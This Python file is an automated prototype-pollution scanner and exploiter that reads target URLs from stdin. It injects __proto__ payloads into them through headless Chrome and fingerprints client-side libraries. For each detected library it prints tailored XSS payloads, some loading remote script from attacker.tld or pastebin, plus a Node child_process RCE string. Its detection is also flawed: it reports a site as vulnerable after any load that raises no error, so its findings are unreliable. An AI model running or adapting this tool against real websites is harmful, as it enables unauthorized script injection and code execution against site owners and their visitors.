import os
import sys
import random
import time
import logging
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from urllib.parse import urlparse

# color constants
INFO = "[\033[33mINFO\033[0m]"
VULNERABLE = "[\033[32mVULN\033[0m]"
ERROR = "[\033[31mERRO\033[0m]"
EXPLOIT = "[\033[34mEXPL\033[0m]"

# user agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
]

# fingerprint javaScript
FINGERPRINT = '''(() => {
  let gadgets = 'default';
  if (typeof _satellite !== 'undefined') {
    gadgets = 'Adobe Dynamic Tag Management ';
  } else if (typeof BOOMR !== 'undefined') {
    gadgets = 'Akamai Boomerang ';
  } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
    gadgets = 'Closure ';
  } else if (typeof DOMPurify !== 'undefined') {
    gadgets = 'DOMPurify ';
  } else if (typeof window.embedly !== 'undefined') {
    gadgets = 'Embedly Cards ';
  } else if (typeof filterXSS !== 'undefined') {
    gadgets = 'js-xss ';
  } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
    gadgets = 'Knockout.js ';
  } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
    gadgets = 'Lodash <= 4.17.15 ';
  } else if (typeof Marionette !== 'undefined') {
    gadgets = 'Marionette.js / Backbone.js ';
  } else if (typeof recaptcha !== 'undefined') {
    gadgets = 'Google reCAPTCHA ';
  } else if (typeof sanitizeHtml !== 'undefined') {
    gadgets = 'sanitize-html ';
  } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
    gadgets = 'Segment Analytics.js ';
  } else if (typeof Sprint !== 'undefined') {
    gadgets = 'Sprint.js ';
  } else if (typeof SwiftypeObject != 'undefined') {
    gadgets = 'Swiftype Site Search ';
  } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
    gadgets = 'Tealium Universal Tag ';
  } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
    gadgets = 'Twitter Universal Website Tag ';
  } else if (typeof wistiaEmbeds !== 'undefined') {
    gadgets = 'Wistia Embedded Video ';
  } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
    gadgets = 'Zepto.js ';
  } else if (typeof Vue != 'undefined') {
    gadgets = "Vue.js";
  } else if (typeof Popper !== 'undefined') {
    gadgets = "Popper.js";
  } else if (typeof pendo !== 'undefined') {
    gadgets = "Pendo Agent";
  } else if (typeof i18next !== 'undefined') {
    gadgets = "i18next";
  } else if (typeof Demandbase != 'undefined') {
    gadgets = "Demandbase Tag";
  } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
    gadgets = "Google Tag Manager plugin for analytics";
  } else if (typeof can != 'undefined' && typeof can.deparam != 'undefined') {
    gadgets = "CanJS deparam";
  } else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
    gadgets = "jQuery parseParams";
  } else if (typeof String.parseQueryString != 'undefined') {
    gadgets = "MooTools More";
  } else if (typeof mutiny != 'undefined') {
    gadgets = "Mutiny";
  } else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
    gadgets = "AMP";
  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
    gadgets = 'jQuery';
  }
  return gadgets;
})();'''

def setup_driver(user_agent):
    options = Options()
    options.add_argument('--headless')
    options.add_argument(f'user-agent={user_agent}')
    return webdriver.Chrome(options=options)

def query_enum(url, quote):
    payloads = [
        "constructor%5Bprototype%5D%5Bppmap%5D=reserved",
        "__proto__.ppmap=reserved",
        "constructor.prototype.ppmap=reserved",
        "__proto__%5Bppmap%5D=reserved",
    ]

    for payload in payloads:
        n = random.randint(0, len(USER_AGENTS) - 1)
        full_url = f"{url}{quote}{payload}"

        driver = setup_driver(USER_AGENTS[n])
        
        try:
            driver.get(full_url)
            res = driver.execute_script('return window.ppmap')
            
            logging.info(f"{VULNERABLE} {full_url}")
            time.sleep(1)
            
            logging.info(f"{INFO} Fingerprinting the gadget...")
            driver.get(url)
            time.sleep(5)
            gadget = driver.execute_script(FINGERPRINT)
            
            logging.info(f"{INFO} Gadget found: {gadget}")
            time.sleep(2)

            if "default" in gadget:
                logging.info(f"{ERROR} No gadget found")
                logging.info(f"{INFO} Website is vulnerable to Prototype Pollution, but not automatically exploitable")
            elif "Adobe Dynamic Tag Management" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[src]=data:,alert(1)//")
            elif "Akamai Boomerang" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js")
            elif "Closure" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[*%20ONERROR]=1&__proto__[*%20SRC]=1")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
            elif "DOMPurify" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[documentMode]=9")
            elif "Embedly" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[onload]=alert(1)")
            elif "jQuery" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[src][]=data:,alert(1)//")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[url]=data:,alert(1)//")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%3dalert(1)>&__proto__[div][2]=1")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>")
            elif "js-xss" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src")
            elif "Knockout.js" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,")
            elif "Lodash <= 4.17.15" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)")
            elif "Marionette.js / Backbone.js" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)")
            elif "Google reCAPTCHA" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[srcdoc][]=<script>alert(1)</script>")
            elif "sanitize-html" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[*][]=onload")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[innerText]=<script>alert(1)</script>")
            elif "Segment Analytics.js" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%3dalert(1)>&__proto__[script][2]=1")
            elif "Sprint.js" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>")
            elif "Swiftype Site Search" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[xxx]=alert(1)")
            elif "Tealium Universal Tag" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js")
            elif "Twitter Universal Website Tag" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)")
            elif "Wistia Embedded Video" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[innerHTML]=<img/src/onerror=alert(1)>")
            elif "Zepto.js" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[onerror]=alert(1)")
            elif "Vue.js" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[v-if]=_c.constructor('alert(1)')()")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[props][][value]=a&__proto__[name]=\"''.constructor.constructor('alert(1)')(),\"")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[template]=<script>alert(1)</script>")
            elif "Popper.js" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[arrow][style]=color:red;transition:all%201s&__proto__[arrow][ontransitionend]=alert(1)")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[reference][style]=color:red;transition:all%201s&__proto__[reference][ontransitionend]=alert(2)")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[popper][style]=color:red;transition:all%201s&__proto__[popper][ontransitionend]=alert(3)")
            elif "Pendo Agent" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[dataHost]=attacker.tld/js.js%23")
            elif "i18next" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%3dalert(1)>")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[lng]=a&__proto__[key]=<img/src/onerror%3dalert(1)>")
            elif "Demandbase Tag" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?")
            elif "Google Tag Manager plugin for analytics" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[customScriptSrc]=//attacker.tld/xss.js")
            elif "CanJS deparam" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[test]=test")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}?constructor[prototype][test]=test")
            elif "jQuery parseParams" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__.test=test")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}?constructor.prototype.test=test")
            elif "MooTools More" in gadget:
                logging.info(f"{INFO} Displaying all possible payloads")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__[test]=test")
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}?constructor[prototype][test]=test")
            elif "Mutiny" in gadget:
                logging.info(f"{EXPLOIT} Final payload: {url}{quote}__proto__.test=test")
            elif "AMP" in gadget:
                logging.info(f"{EXPLOIT} Final XSS payload: {url}{quote}__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")
                logging.info(f"{INFO} There might be an possible RCE exploit. Trying to leverage the impact...")
                time.sleep(3)
                
                parsed_url = urlparse(url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
                
                logging.info(f"{INFO} Sending a simple HTTP Request to target")
                resp0 = requests.get(base_url)
                
                if 200 <= resp0.status_code <= 399:
                    logging.info(f"{INFO} Payload 1 successfully sent")
                    time.sleep(1)
                else:
                    logging.info(f"{ERROR} Something went wrong. Please try again!")
                
                logging.info(f"{INFO} Sending request to enable AMP...")
                resp = requests.get(f"{url}{quote}amp=1&__proto__.amp=hybrid")
                time.sleep(2)
                
                if 200 <= resp.status_code <= 399:
                    logging.info(f"{INFO} Payload 2 successfully sent")
                    time.sleep(3)
                    logging.info(f"{EXPLOIT} Final RCE payload (use Windows to popup Calculator): {url}{quote}__proto__.validator=https://pastebin.com/raw/2H8MHf2G")
                    logging.info(f"{INFO} Payload used: (this.constructor.constructor(\"return process.mainModule.require('child_process')\")()).execSync('calc')")
                else:
                    logging.info(f"{ERROR} Something went wrong. Please try again!")
            
            break
            
        except Exception as e:
            logging.error(f"{ERROR} {full_url}")
            continue
        finally:
            driver.quit()

def main():
    print("""                                                                                 
    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v2.0.1
   dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
  dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
 dMP     dMP     dMP dMP dMP dMP dMP dMP           @kleiton0x7e
dMP     dMP     dMP dMP dMP dMP dMP dMP            @1hehaq
    """)
    
    time.sleep(2)
    random.seed(time.time())
    
    for url in sys.stdin:
        url = url.strip()
        if "?" in url:
            query_enum(url, "&")
        else:
            query_enum(url, "?")
            query_enum(url, "#")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    main()
